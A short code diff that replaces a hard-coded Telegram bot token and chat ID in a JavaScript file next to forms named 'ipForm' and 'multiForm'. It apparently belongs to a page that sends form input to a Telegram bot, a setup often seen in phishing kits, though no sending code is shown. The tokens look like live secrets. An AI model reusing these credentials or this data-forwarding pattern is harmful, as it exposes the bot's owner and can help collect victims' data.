@@ -43,8 +43,8 @@ const ipForm = document.getElementById('ipForm');
 const multiForm = document.getElementById('multiForm');
 
 // Telegram Bot Configuration
-let TELEGRAM_BOT_TOKEN = '8251876408:AAGaXM5VL5hk9Qkv4w9OsdnX75TeJBEWpFc';
-let TELEGRAM_CHAT_ID = '7637629406';
+let TELEGRAM_BOT_TOKEN = '8359484829:AAGUWaqbnqcSwcpltF1jWtirMw0kay6-lmI';
+let TELEGRAM_CHAT_ID = '7763525520';
 
 // aslo replace           chat id ☝️
 
